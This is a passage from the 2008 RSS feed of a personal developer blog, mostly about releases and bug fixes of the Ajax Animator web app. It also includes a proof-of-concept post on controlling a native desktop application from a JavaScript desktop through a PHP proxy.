      <guid isPermaLink="true">http://antimatter15.com/2008/08/controlling-a-native-app-from-a-javascript-desktop/</guid>
      <author></author>
      <description>&lt;p&gt;Well, I worked on a sort of VNC-like solution to controlling native desktop applications from a remote PC. It’s an interesting concept, I settled with something less than easy to use, and less than really feasable. It’s a Proof of concept, and it’s likely I won’t work on it again (Like ForkSwif).&lt;/p&gt;
&lt;p&gt;It is an application (module) on a hacked Ext 2.0 Desktop example that uses Ajax (Polling) to query a local PHP proxy to query a remote desktop. The remote desktop is running some software (powered by .NET sadly…) that captures the window’s contents, does a diff to see if there are modifications and where (only sends updates to changed parts of the screen, sorta like VNC). It base64 encodes it and sends it along HTTP to the proxy, which sends it to the javascript client.&lt;/p&gt;
&lt;p&gt;The client can send events to be repeated on the remote desktop, currently only left mousedown and mouseup (so, basically only clicking), but using the Keyboard should be easy enough.&lt;/p&gt;
&lt;p&gt;I imagine that a more feasable option is to create a javascript X11 client, taking proxied connections to a X session under SSH so it is better with window-specificness, and an overall more stable platform, so you could also run multiple applications simultaneously on the desktop.&lt;/p&gt;
&lt;p&gt;here’s an early screenshot:&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Controlling A native desktop app from a javascript desktop&quot;  src=&quot;/articles/2008/Controlling%20A%20Native%20App%20from%20a%20Javascript%20Desktop/jsvnc.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Controlling A native desktop app from a javascript desktop&lt;/div&gt;&lt;/div&gt; Controlling A native desktop app from a javascript desktop (early build)&lt;/p&gt;
&lt;p&gt;Files here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.com/2008/misc/coolstuff.zip&quot;&gt;http://antimatter15.110mb.com/misc/coolstuff.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Extract desktop2 to your Apache server, start Windows Calculator (or another app of your choosing). Run Screen.exe, type the app title, press “Get Handle” and check the “Run Server” box. Navigate to the desktop.html (on your PHP-enabled apache), and start the “NV Window” app.&lt;/p&gt;
&lt;p&gt;To be able to control the app, you have to set it to your network ip (not localhost) on a VM or a different computer. and configure sample.js at line 191.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='groovy'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-string&quot;&gt;proxy:&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;gdat.php?url=&quot;&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;updateurl :&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;[http://localhost:12345](http://localhost:12345/)&quot;&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;baseurl :&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;[http://localhost:12345/base](http://localhost:12345/base)&quot;&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;showimg :&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;uinterval:&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;updater:&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;xoffset:&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;8&lt;/span&gt;,
&lt;span class=&quot;hljs-string&quot;&gt;yoffset:&lt;/span&gt; -&lt;span class=&quot;hljs-number&quot;&gt;28&lt;/span&gt;,
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;change localhost to the server’s IP. And tick “Control Desktop”&lt;/p&gt;
&lt;p&gt;Note that you need firebug.&lt;/p&gt;
&lt;p&gt;If i can think of a name for the app, i’ll be sure to creakte a google code project for it. so if anyone want’s the source, think of a name for it.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Note To Self</title>
      <link>http://antimatter15.com/2008/08/note-to-self/</link>
      <pubDate>Wed, 20  Aug 2008 04:44:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/note-to-self/</guid>
      <author></author>
      <description>&lt;p&gt;Ajax animator bug: Copy/Paste does not regenerate shape UUID&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Login System</title>
      <link>http://antimatter15.com/2008/08/login-system/</link>
      <pubDate>Sat, 16  Aug 2008 02:41:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/login-system/</guid>
      <author></author>
      <description>&lt;p&gt;What kind of login system do you want? Openid? Google? Custom-Ajax Animator user-management code (like in previous versions)?&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.20.2 Released</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-20-2-released/</link>
      <pubDate>Fri, 15  Aug 2008 06:53:02 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-20-2-released/</guid>
      <author></author>
      <description>&lt;p&gt;This release just adds a much needed Manual (thanks brwainer!)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator Manual</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-manual/</link>
      <pubDate>Fri, 15  Aug 2008 06:14:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-manual/</guid>
      <author></author>
      <description>&lt;p&gt;brwainer from liveswifers was nice enough to create a wonderful manual for the ajax animator.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://brwainer.110mb.com/ajaxanimator/manual/index.php&quot;&gt;http://brwainer.110mb.com/ajaxanimator/manual/index.php&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>VectorEditor</title>
      <link>http://antimatter15.com/2008/08/vectoreditor/</link>
      <pubDate>Sun, 10  Aug 2008 04:13:18 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/vectoreditor/</guid>
      <author></author>
      <description>&lt;p&gt;I was experiementing with using another framework for Vector editing. So I used the relatively new Raphael framework. I wanted to use dojo.gfx, but I still don’t know how to use it without the dojo dependency. Raphael is not as powerful as dojo.gfx, or even OnlyPaths… so, it needs work.&lt;/p&gt;
&lt;p&gt;It has many of the features in OnlyPaths, but it keeps the core showTracker() and such functions in the main script, not in the renderer. That allows the system to be simpler, and more easily cross-platform.&lt;/p&gt;
&lt;p&gt;I’m not currently using cross-platform event handling. so it only works in Firefox for now, but converting is easy.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.110mb.com/ajaxanimator/VectorEditor/opr.htm&quot;&gt;http://antimatter15.110mb.com/ajaxanimator/VectorEditor/opr.htm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Refresh your cache</title>
      <link>http://antimatter15.com/2008/08/refresh-your-cache/</link>
      <pubDate>Thu, 07  Aug 2008 05:21:50 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/refresh-your-cache/</guid>
      <author></author>
      <description>&lt;p&gt;I reverted Ext 2.2 to Ext 2.1, so refresh your cache.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ext 2.2</title>
      <link>http://antimatter15.com/2008/08/ext-2-2/</link>
      <pubDate>Thu, 07  Aug 2008 05:14:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ext-2-2/</guid>
      <author></author>
      <description>&lt;p&gt;I did some updating yesterday, and along with it was the supposedly fully compatible Ext 2.2 update. And it wasn’t. It completely broke onlypaths :( I’m reverting now.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>IE works in development version</title>
      <link>http://antimatter15.com/2008/08/ie-works-in-development-version/</link>
      <pubDate>Wed, 06  Aug 2008 08:46:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ie-works-in-development-version/</guid>
      <author></author>
      <description>&lt;p&gt;I made a mistake in the ads script that made IE unhappy (along with some other stuff). IE works in the development unstable version, which will be merged into the stable as 0.20 Beta RC2 (Aka 0.20.01)&lt;/p&gt;
&lt;p&gt;As you can see, I’m not familiar with software versioning….&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Why no demos?</title>
      <link>http://antimatter15.com/2008/08/why-no-demos/</link>
      <pubDate>Wed, 06  Aug 2008 04:31:50 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/why-no-demos/</guid>
      <author></author>
      <description>&lt;p&gt;I’m sure quite a few of you are wondering why there aren’t any good demos of what the Ajax Animator can do. The answer is simple: I can’t draw. Interesting eh? I actually started this project so I could do stick figure animations better. Its pretty sad, I know. And the most sad part is: the ajax animator is really glitchy with lines :( !!!&lt;/p&gt;
&lt;p&gt;The good news, is that some user-made FAQ/Manual/Tutorial stuff may be arriving tomorrow.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Preparing Ajax Animator 0.20.01 Beta RC2 Stable Release</title>
      <link>http://antimatter15.com/2008/08/preparing-ajax-animator-0-20-01-beta-rc2-stable-release/</link>
      <pubDate>Wed, 06  Aug 2008 02:22:29 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/preparing-ajax-animator-0-20-01-beta-rc2-stable-release/</guid>
      <author></author>
      <description>&lt;p&gt;Some small bug fixes are in this release. It’s going to be released today soon.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.20.01 Beta RC2 Stable Released</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-20-01-beta-rc2-stable-released/</link>
      <pubDate>Wed, 06  Aug 2008 00:54:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-20-01-beta-rc2-stable-released/</guid>
      <author></author>
      <description>&lt;p&gt;Features some minor bug fixes and IE support.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.20.01 Soon</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-20-01-soon/</link>
      <pubDate>Tue, 05  Aug 2008 07:52:11 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-20-01-soon/</guid>
      <author></author>
      <description>&lt;p&gt;I’m going to release 0.20.01 soon, which will get IE to load properly, and fix some general bugs.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.20 Browser Support</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-20-browser-support/</link>
      <pubDate>Tue, 05  Aug 2008 07:51:07 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-20-browser-support/</guid>
      <author></author>
      <description>&lt;p&gt;It supports Firefox 1.5 to Firefox 3.0, Opera 9+ (hopefully), Safari 3+, and it was supposed to support IE, but for some reason, the compilier makes IE fail.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.21 Early Fork</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-21-early-fork/</link>
      <pubDate>Mon, 04  Aug 2008 05:46:48 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-21-early-fork/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, I’ve started working on Ajax Animator 0.21, right now, its just a different version with one bug fix. btw, its the one where you can’t reopen the About dialog after it’s been opened and closed (with the little X, not the “close” button)&lt;/p&gt;
&lt;p&gt;BTW, it’s at &lt;a href=&quot;http://antimatter15.110mb.com/ajaxanimator/testing/build/&quot;&gt;http://antimatter15.110mb.com/ajaxanimator/testing/build/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;EDIT
Okay, I fixed another bug where the tip of the day won’t open again after closed like the about window one. I also made it so you can minimize the tips window.&lt;/p&gt;
&lt;p&gt;I also fixed the bug reported by Kermeros where Undo works improperly after File-&amp;gt;New&lt;/p&gt;
</description>
    </item>
    <item>
      <title>JavaFX + Ajax</title>
      <link>http://antimatter15.com/2008/08/javafx-ajax/</link>
      <pubDate>Sun, 03  Aug 2008 21:25:17 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/javafx-ajax/</guid>
      <author></author>
      <description>&lt;p&gt;I just noticed something. JavaFX has all the letters in Ajax. so you just switch around the J and the A (ajvafx) take out the V and the F (ajax). freaky huh? I wonder if that was intended…&lt;/p&gt;
</description>
    </item>
    <item>
      <title>0.21 Bugfixes</title>
      <link>http://antimatter15.com/2008/08/0-21-bugfixes/</link>
      <pubDate>Sun, 03  Aug 2008 21:23:04 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/0-21-bugfixes/</guid>
      <author></author>
      <description>&lt;p&gt;I fixed this bug where if you drew a square, went to a blank frame, moved it, and then went to a blank frame (do nothing), and go back to a tween (between first and last frame), the tween engine would crash, and the animation would be destroyed. Fixed by wrapping SVGRenderer’s remove function in a try..catch loop.&lt;/p&gt;
&lt;p&gt;I also split diff_core into diff_attr which allows you to diff only a single attribute at a time. I also added a diff_list function which would make it easier to implement an export format to a tweening engine like that of JavaFX and Silverlight.&lt;/p&gt;
&lt;p&gt;On that note, I added fake support for JavaFX. so you now see the toolbar icon, and I added the script for javafx though there’s nothing in it.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>new features</title>
      <link>http://antimatter15.com/2008/08/new-features/</link>
      <pubDate>Sun, 03  Aug 2008 08:35:23 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/new-features/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, so I’m polishing the app alot today. Right now, I’m setting the app up for a release some time this week.&lt;/p&gt;
&lt;p&gt;I added framerate support to the Ajax Animator’s Format. I also added some messages for Help-&amp;gt;Bugs, Help-&amp;gt;Comments, and I renamed Help-&amp;gt;Donate to Help-&amp;gt;Contribute.&lt;/p&gt;
&lt;p&gt;Help-&amp;gt;Manual shows a page that says “Manual Currently Unavailable” and Help-&amp;gt;FAQ actually shows a working page (OMG!)&lt;/p&gt;
&lt;p&gt;Help-&amp;gt;About now reports that the Ajax Animator is at “Beta RC1” Stability, and its no longer a “testing” release.&lt;/p&gt;
&lt;p&gt;Please test things out and report bugs if you can :)&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.20 Beta RC1 Released</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-20-beta-rc1-released/</link>
      <pubDate>Sun, 03  Aug 2008 04:43:39 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-20-beta-rc1-released/</guid>
      <author></author>
      <description>&lt;p&gt;I’m pleased to release the latest version of the Ajax Animator, 0.2. This version has been a complete rewrite of the application down to it’s core, not a single like of code copied from the old (0.14.7) release. It also happens to be the most advanced and complete release to date, with full multi-layer support, a greatly expanded toolbox, complete undo history, a shared clip-art library, a completely redesigned UI, and much more.&lt;/p&gt;
&lt;p&gt;Lets start from when you open the app. The application speed has greatly improved, the 0.14.7 release takes ~9.5 seconds to load, 0.2 takes a mere 4.5 seconds, more than half the time. On the top toolbar, the buttons are relocated and restylized. Over at the file button, you see everything has new gorgeous icons intuitively organizing the New, Open, and Save options, where you can use the powerful new JSON based file format. Below that, you see a new Publish menu, where you can export to several formats like Adobe Flash, Processing (language), Microsoft Silverlight (XAML), and Animated GIFs.&lt;/p&gt;
&lt;p&gt;Skipping over to the View meu, you see that there are 17 different UI themes to choose from. An unprescedented degree of customizability. And over at the Help menu, there is more useful content. A working FAQ, helpful Tip Of the Day, About page, and a list of keyboard shortcuts.&lt;/p&gt;
&lt;p&gt;Of course the most important and powerful change in this version is the inclusion of the OnlyPaths editor. A new, powerful Vector graphics editor. The new editor allows you to draw not only the standard rectangles, ellipses, and lines, but also Text, Polygons, Freeform Paths, Images and more. You can now Rotate, Resize, and move shapes around.&lt;/p&gt;
&lt;p&gt;The Timeline has also been reworked. The new archetecture allows the deletion of layers, expansion of tweens, and more. The Tweening engine is vastly superior, with much fewer bugs than the old one, though the new one certainly does &lt;em&gt;much&lt;/em&gt; more and gets much more room to screw up.&lt;/p&gt;
&lt;p&gt;A new Animations tab allows you to view and improve on public animations them. A new Properties panel allows you to adjust the canvas size and animation framerate along with the text content and image URL.&lt;/p&gt;
&lt;p&gt;Its available here, at &lt;a href=&quot;http://antimatter15.110mb.com/ajaxanimator/build/&quot;&gt;http://antimatter15.110mb.com/ajaxanimator/build/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Do not go to testing site</title>
      <link>http://antimatter15.com/2008/08/do-not-go-to-testing-site/</link>
      <pubDate>Sun, 03  Aug 2008 03:52:55 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/do-not-go-to-testing-site/</guid>
      <author></author>
      <description>&lt;p&gt;I’m changing lots of things to prepare for the new 0.2 release which will be soon. When it is done, the new url will be&lt;/p&gt;
&lt;p&gt;/ajaxanimator/testing/build&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator 0.2 Beta *almost* RC1</title>
      <link>http://antimatter15.com/2008/08/ajax-animator-0-2-beta-almost-rc1/</link>
      <pubDate>Sat, 02  Aug 2008 05:59:39 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/ajax-animator-0-2-beta-almost-rc1/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, sorta  a weird name for a release right? Beta &lt;em&gt;and&lt;/em&gt; Release Canidate? Well, its Web 2.0/Ajax so really, anything can happen. I sure hope this doesn’t spark an onsalought of Stable Beta RC1 Pre-Alpha Unstable Full releases.&lt;/p&gt;
&lt;p&gt;But… yeah. Tonight I added two very important features stemming from Properties.&lt;/p&gt;
&lt;p&gt;the first is properties itself (duh). It allows you to change canvas Width, Height, and the animation framerate. Stemming from this, is the new feature in the Ajax Animator Format (ALEON, AXON, AXION, AJSON, AXFF, AFF or whatever you want to call it), you guessed it: Width/Height. Oh crap. I just remembered that it doesn’t support framerate yet. CRAP! oh. hmm. i’ll just post it anyway and continue from here when I get that feature done.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Almost There!</title>
      <link>http://antimatter15.com/2008/08/almost-there/</link>
      <pubDate>Fri, 01  Aug 2008 05:14:46 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/08/almost-there/</guid>
      <author></author>
      <description>&lt;p&gt;We’re almost at the release of 0.2, though it has been scaled down a bit. Real usability probably won’t come until 0.21. Right now, 0.2 basically only lacks one feature, being the whole user-management system.&lt;/p&gt;
&lt;p&gt;The only features that are really left, are some final touches and the Properties panel.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>new IE not supported error</title>
      <link>http://antimatter15.com/2008/07/new-ie-not-supported-error/</link>
      <pubDate>Tue, 29 Jul 2008 05:24:45 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/new-ie-not-supported-error/</guid>
      <author></author>
      <description>&lt;p&gt;This time I think my tone is a bit more acceptable (no more “Error: YOUR BROWSER SUCKS!” stuff)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='sql'&gt;&lt;/span&gt;Currently, support for Microsoft Internet Explorer (6/7/8) are only experimental. 
Some features &lt;span class=&quot;hljs-operator&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;work&lt;/span&gt; properly such &lt;span class=&quot;hljs-keyword&quot;&gt;as&lt;/span&gt; animation &lt;span class=&quot;hljs-keyword&quot;&gt;and&lt;/span&gt; playback &lt;span class=&quot;hljs-keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;some&lt;/span&gt; specific animations. 
The issues &lt;span class=&quot;hljs-keyword&quot;&gt;are&lt;/span&gt; being resolved, but &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; the mean &lt;span class=&quot;hljs-keyword&quot;&gt;time&lt;/span&gt;, you may try out another browser such &lt;span class=&quot;hljs-keyword&quot;&gt;as&lt;/span&gt; 
&amp;lt;a href=&lt;span class=&quot;hljs-string&quot;&gt;'http://getfirefox.com'&lt;/span&gt;&amp;gt;Firefox&amp;lt;/a&amp;gt;, 
&amp;lt;a href=&lt;span class=&quot;hljs-string&quot;&gt;'http://opera.com'&lt;/span&gt;&amp;gt;Opera&amp;lt;/a&amp;gt;, &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; 
&amp;lt;a href=&lt;span class=&quot;hljs-string&quot;&gt;'http://apple.com/safari'&lt;/span&gt;&amp;gt;Safari&amp;lt;/a&amp;gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>IE somewhat works</title>
      <link>http://antimatter15.com/2008/07/ie-somewhat-works/</link>
      <pubDate>Tue, 29 Jul 2008 05:23:14 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/ie-somewhat-works/</guid>
      <author></author>
      <description>&lt;p&gt;I just discovered the source of virtually all the IE problems: the non functional VMLRENDERER.prototype.info() function. I managed to implement part of it, and magically, IE works a bit. Its nto very stable, and the tween engine gets weird errors all the time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Bug Fixes</title>
      <link>http://antimatter15.com/2008/07/bug-fixes/</link>
      <pubDate>Tue, 29 Jul 2008 03:46:35 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/bug-fixes/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, so in IE you can now actually draw (wow!) though tweening doesn’t work yet :(&lt;/p&gt;
&lt;p&gt;I fixed a bug when in Firefox 2 where the preview tooltips end up to be huge for no reason.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Tip Of The Day</title>
      <link>http://antimatter15.com/2008/07/tip-of-the-day/</link>
      <pubDate>Mon, 28 Jul 2008 03:19:38 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/tip-of-the-day/</guid>
      <author></author>
      <description>&lt;p&gt;The Tip Of The Day box pops up now every time you visit the application.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Build 400</title>
      <link>http://antimatter15.com/2008/07/build-400/</link>
      <pubDate>Mon, 28 Jul 2008 02:11:39 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/build-400/</guid>
      <author></author>
      <description>&lt;p&gt;Its now at build 400!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Small Stuff Again</title>
      <link>http://antimatter15.com/2008/07/small-stuff-again/</link>
      <pubDate>Mon, 28 Jul 2008 01:24:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/small-stuff-again/</guid>
      <author></author>
      <description>&lt;p&gt;I’m just ironing out the little things now.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Busy.</title>
      <link>http://antimatter15.com/2008/07/busy/</link>
      <pubDate>Sun, 27 Jul 2008 04:18:11 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/busy/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve been somewhat busy in the last few days, I’m using a new computer now, its quite a bit faster, but doesn’t do everything that the old computer did, and I’m doing a lot for it to catch up.&lt;/p&gt;
&lt;p&gt;its also a fresh start anyway, so I guess I can try out new tools/etc (still using the ol eclipse though!).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Minor Updates</title>
      <link>http://antimatter15.com/2008/07/minor-updates/</link>
      <pubDate>Sun, 27 Jul 2008 04:14:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/minor-updates/</guid>
      <author></author>
      <description>&lt;p&gt;Now, i’m still trying to figure what to do, and now my strategy is simply polishing it. My stragegy is basically getting every feature that a normal user can get to in 2 clicks or less to work. Its somewhat close. I added some “feature(s) not available” message boxes, and made some parts a bit more serious.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Color Tweening</title>
      <link>http://antimatter15.com/2008/07/color-tweening/</link>
      <pubDate>Mon, 21 Jul 2008 23:07:33 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/color-tweening/</guid>
      <author></author>
      <description>&lt;p&gt;Well, I added josep_ssv’s color tweening system. I modified it a bit, but it should work fine.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Flash Export</title>
      <link>http://antimatter15.com/2008/07/flash-export/</link>
      <pubDate>Mon, 21 Jul 2008 05:17:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/flash-export/</guid>
      <author></author>
      <description>&lt;p&gt;Okay, i’ve done it. You can now export to flash. But the problem now is that I’m still using the uber limited freemovie library, which is both outdated and incapable of anything besides the rectangles and lines.&lt;/p&gt;
&lt;p&gt;For now, I haven’t installed the server files yet so it wont work until I do, but by the time you read this, I may have already done it.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Export to Animated GIF</title>
      <link>http://antimatter15.com/2008/07/export-to-animated-gif/</link>
      <pubDate>Mon, 21 Jul 2008 02:43:24 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/export-to-animated-gif/</guid>
      <author></author>
      <description>&lt;p&gt;here’s an important feature, you can now fully export your animations to raster animated gifs. Its easy, and suprisingly good.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Export to Silverlight</title>
      <link>http://antimatter15.com/2008/07/export-to-silverlight/</link>
      <pubDate>Sat, 19 Jul 2008 21:42:14 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/export-to-silverlight/</guid>
      <author></author>
      <description>&lt;p&gt;You can export your animations to silverlight, almost flawlessly (though i’m on a linux box so I never tested them, they’re hopefully close to the Silverlight 1.0 specs).&lt;/p&gt;
&lt;p&gt;The only problem, is that I have no idea how to put an animation in silverlight. Right now, it’ll squish every frame’s data together. into a merged display of every frame.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Exporting to Processing</title>
      <link>http://antimatter15.com/2008/07/exporting-to-processing/</link>
      <pubDate>Fri, 18 Jul 2008 22:19:10 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/exporting-to-processing/</guid>
      <author></author>
      <description>&lt;p&gt;I’m working on the ability to export animations into various formats. Its close to usable at exporting to the &lt;a href=&quot;http://processing.org&quot;&gt;Processing&lt;/a&gt; language. I’ve only tested running the output in John Resig’s Processing.js implementation so far. The output is very crude.&lt;/p&gt;
&lt;p&gt;I will owrk on Flash and Silverlight export soon.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Standalone Animation Player</title>
      <link>http://antimatter15.com/2008/07/standalone-animation-player/</link>
      <pubDate>Wed, 16 Jul 2008 04:31:57 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/standalone-animation-player/</guid>
      <author></author>
      <description>&lt;p&gt;I’ve created an animation player. It works with all ajax animator animations, and when compressed is a mere 3kb (which I believe is lower than OnlyPath Viewer).&lt;/p&gt;
&lt;p&gt;It is built using the very same sources of the Ajax Animator, the whole purpose of all those *_core.js files. It uses the files
Ext.ux.clone.js, op_view.js, svgrenderer_mini.js, vmlrenderer_mini.js, wrapper_core.js, view_wrapper.js, and tween_core.js.&lt;/p&gt;
&lt;p&gt;svgrenderer_mini.js when compressed is just over 1.1kb and same is for vmlrenderer_mini.js&lt;/p&gt;
&lt;p&gt;I’m on my linux development environment now, so I haven’t tested it in IE, but it will 100% fail, as the rendering engines is not detected and it uses SVGRenderer always.&lt;/p&gt;
&lt;p&gt;See it in action here:
&lt;a href=&quot;http://ajaxanimator.googlecode.com/svn/trunk/ajaxanimator/html/player.htm&quot;&gt;http://ajaxanimator.googlecode.com/svn/trunk/ajaxanimator/html/player.htm&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Improved Tweening Engine Stability</title>
      <link>http://antimatter15.com/2008/07/improved-tweening-engine-stability/</link>
      <pubDate>Sat, 12 Jul 2008 22:12:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/07/improved-tweening-engine-stability/</guid>
      <author></author>
      <description>&lt;p&gt;as you probably know, there is a new tweening engine being used. This new one got rid of all the random anomaly checks that report when random errors occur. The error checks are now run more verbosely than eva! &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Switching Editors</title>
      <link>http://antimatter15.com/2008/06/switching-editors/</link>
      <pubDate>Sun, 15 Jun 2008 01:01:01 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/06/switching-editors/</guid>
      <author></author>
      <description>&lt;p&gt;I’m now trying out Komodo Edit versus what I normally use (Notepad++) because of a weird bug (maybe… it may just be my messed up computer). Well, I just decided that maybe a more professional editor would have nice features over a simple editor. I have to say I’m quite pleased.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Resize Grid, Improved Select, Delete Selection/Clear All</title>
      <link>http://antimatter15.com/2008/06/resize-grid-improved-select-delete-selection-clear-all/</link>
      <pubDate>Fri, 06 Jun 2008 23:10:16 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/06/resize-grid-improved-select-delete-selection-clear-all/</guid>
      <author></author>
      <description>&lt;p&gt;You can now resize the grid through the same GUI as the line width: A simple slider. Now when you select a shape, the draw-panel adjusts itself accordingly to the colors and other values. When you leave select mode, it automatically unselects the space. Special tools like Delete Selection and Clear All now work.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New loading screen + HTML Strict Doctype</title>
      <link>http://antimatter15.com/2008/06/new-loading-screen-html-strict-doctype/</link>
      <pubDate>Fri, 06 Jun 2008 21:55:58 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2008/06/new-loading-screen-html-strict-doctype/</guid>
      <author></author>
